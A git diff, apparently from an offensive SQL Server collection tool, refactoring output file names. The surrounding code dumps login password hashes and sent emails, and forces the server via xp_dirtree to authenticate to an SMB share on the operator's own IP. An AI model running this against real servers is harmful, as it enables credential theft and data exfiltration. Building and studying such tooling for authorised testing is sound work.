@@ -20,8 +20,7 @@ class MSSQLCollector(BaseCollector):
 
         self.type = 'mssql'
 
-        self.file_prefix = secrets.token_hex(2)
-        self.dir_name = f'{self.target.replace('.', '-')}_{self.type}_{self.file_prefix}'
+        self.dir_name = f'{self.target.replace('.', '-')}_{self.type}_{secrets.token_hex(2)}'
 
         self.version_query = 'SELECT @@VERSION'
         self.hash_query = 'SELECT name, password_hash FROM sys.sql_logins'
@@ -49,14 +48,14 @@ class MSSQLCollector(BaseCollector):
         self.cursor = conn.cursor()
     
     def getAllTables(self):
-        with open(f'{self.dir_name}/{self.file_prefix}_tables.csv', 'w') as f:
+        with open(f'{self.dir_name}/tables.csv', 'w') as f:
             f.write("TableName,SchemaName,Database\n")
         for db in self.dbs:
             table_query = f'SELECT TABLE_NAME, TABLE_SCHEMA FROM {db}.INFORMATION_SCHEMA.TABLES'
             self.getTables(table_query, db)
     
     def getAllColumns(self):
-        with open(f'{self.dir_name}/{self.file_prefix}_columns.csv', 'w') as f:
+        with open(f'{self.dir_name}/columns.csv', 'w') as f:
             f.write('ColumnName,TableName,Database\n')
         for db in self.dbs:
             column_query = f'SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, TABLE_CATALOG FROM {db}.INFORMATION_SCHEMA.COLUMNS'
@@ -77,7 +76,7 @@ class MSSQLCollector(BaseCollector):
                 print(f'{GREEN}No sent emails in sysmail{RESET}')
                 return
             else:
-                with open(f'{self.dir_name}/{self.file_prefix}_emails_10.csv', 'a') as f:
+                with open(f'{self.dir_name}/emails_10.csv', 'a') as f:
                     f.write('Recipients,Subject,Body\n')
                     for row in rows:
                         f.write(f'{row[0]},{row[1]},{row[2]}\n')
@@ -95,7 +94,7 @@ class MSSQLCollector(BaseCollector):
         else:
             self.findings['tables'] = self.matches
 
-        with open(f'{self.dir_name}/{self.file_prefix}_findings.csv', 'a') as f:
+        with open(f'{self.dir_name}/findings.csv', 'a') as f:
             if self.columns:
                 f.write('ColumnName,TableName,Database,SampleData\n')
                 for item in self.findings['columns']:
@@ -126,7 +125,7 @@ class MSSQLCollector(BaseCollector):
         smb_thread = threading.Thread(target=self.coerceXpDirtree, args=(local_ip,), daemon=True)
         smb_thread.start()
 
-        unc_path = f"\\\\{local_ip}\\coerce_share\\{self.file_prefix}.txt"
+        unc_path = f"\\\\{local_ip}\\coerce_share\\test.txt"
         xp_dirtree_query = f'EXEC master..xp_dirtree \'{unc_path}\', 1, 1'
         try:
             self.cursor.execute(xp_dirtree_query)
